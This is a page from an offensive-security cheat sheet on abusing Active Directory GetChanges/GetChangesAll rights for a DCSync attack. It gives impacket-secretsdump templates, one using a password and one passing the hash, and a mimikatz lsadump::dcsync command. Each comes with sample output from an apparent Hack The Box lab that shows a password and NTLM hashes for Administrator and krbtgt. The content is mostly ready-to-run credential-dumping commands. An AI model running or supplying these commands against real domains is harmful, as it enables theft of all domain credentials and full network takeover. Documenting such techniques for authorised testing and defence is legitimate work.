---
title: "GetChanges/GetChangesAll"
date: 2024-7-9
tags: ["Dcsync", "Getchanges", "Getchangesall", "Secretsdump", "Active Directory", "Windows"]
---

#### Abuse #1: DCSync Attack

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# With creds
impacket-secretsdump -just-dc '<USER>:<PASSWORD>@<TARGET>'
```

```console {class="sample-code"}
$ impacket-secretsdump -just-dc 'mrlky:Football#7@10.10.10.103'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
...[SNIP]...
[*] Cleaning up...
```

```console
# With hashes
impacket-secretsdump -hashes :<HASH> -just-dc '<DOMAIN>/<USER>@<TARGET>'
```

```console {class="sample-code"}
$ impacket-secretsdump -hashes :bceef4f6fe9c026d1d8dec8dce48adef -just-dc 'sizzle.htb/mrlky@10.10.10.103'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
...[SNIP]...
[*] Cleaning up...
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
.\mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:administrator" "exit"
```

```console {class="sample-code"}
PS C:\programdata> .\mimikatz.exe "lsadump::dcsync /domain:HTB.LOCAL /user:administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:HTB.LOCAL /user:administrator
[DC] 'HTB.LOCAL' will be the domain
[DC] 'sizzle.HTB.LOCAL' will be the DC server
[DC] 'administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 7/12/2018 1:32:41 PM
Object Security ID   : S-1-5-21-2379389067-1826974543-3574127760-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f6b7160bfc91823792e0ac3a162c9267
    ntlm- 0: f6b7160bfc91823792e0ac3a162c9267
    ntlm- 1: c718f548c75062ada93250db208d3178
    lm  - 0: 336d863559a3f7e69371a85ad959a675

...[SNIP]...

mimikatz(commandline) # exit
Bye!
```

{{< /tabcontent >}}
